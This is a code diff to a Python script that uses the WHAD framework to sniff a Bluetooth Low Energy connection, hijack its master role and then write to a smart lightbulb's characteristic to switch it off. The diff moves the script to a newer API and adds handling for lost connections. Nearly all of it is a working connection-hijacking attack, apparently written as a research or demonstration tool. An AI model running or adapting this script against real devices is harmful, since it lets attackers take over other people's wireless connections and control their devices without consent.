@@ -1,10 +1,16 @@
 from whad.ble import Sniffer, Hijacker, Central
 from whad.device import WhadDevice
 from whad.exceptions import WhadDeviceNotFound
+from whad.ble.exceptions import ConnectionLostException
 from time import time,sleep
-from whad.ble.attribute import UUID
+from whad.ble.profile import UUID
 from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Write_Request
 import sys
+
+
+def show(pkt):
+    print(repr(pkt.metadata))
+    pkt.show()
 
 if __name__ == '__main__':
     if len(sys.argv) >= 2:
@@ -16,21 +22,22 @@ if __name__ == '__main__':
             dev = WhadDevice.create(interface)
 
             sniffer = Sniffer(dev)
-            sniffer.configure(advertisements=False, connection=True)
-            sniffer.start()
-            while not sniffer.is_synchronized():
-                sleep(1)
+            connection = sniffer.wait_new_connection()
             print("Press enter to hijack.")
-            input()
-            hijacker = sniffer.available_actions(Hijacker)[0]
+
+            hijacker = Hijacker(dev, connection)
             success = hijacker.hijack(master=True, slave=False)
             if success:
                 print("Master successfully hijacked !")
-                central = hijacker.available_actions(Central)[0]
+                central = Central(dev, existing_connection=connection)
                 periph = central.peripheral()
+
                 periph.discover()
 
-                c = periph.get_characteristic(UUID("a8b3fff0-4834-4051-89d0-3de95cddd318"), UUID("a8b3fff1-4834-4051-89d0-3de95cddd318"))
+                c = periph.get_characteristic(
+                    UUID("a8b3fff0-4834-4051-89d0-3de95cddd318"),
+                    UUID("a8b3fff1-4834-4051-89d0-3de95cddd318")
+                )
                 while True:
                     print("Press enter to turn off the lightbulb.")
                     input()
@@ -41,6 +48,10 @@ if __name__ == '__main__':
 
             else:
                 print("Fail, exiting...")
+
+        except ConnectionLostException as e:
+            print("Connection lost")
+
         except (KeyboardInterrupt, SystemExit):
             dev.close()
 
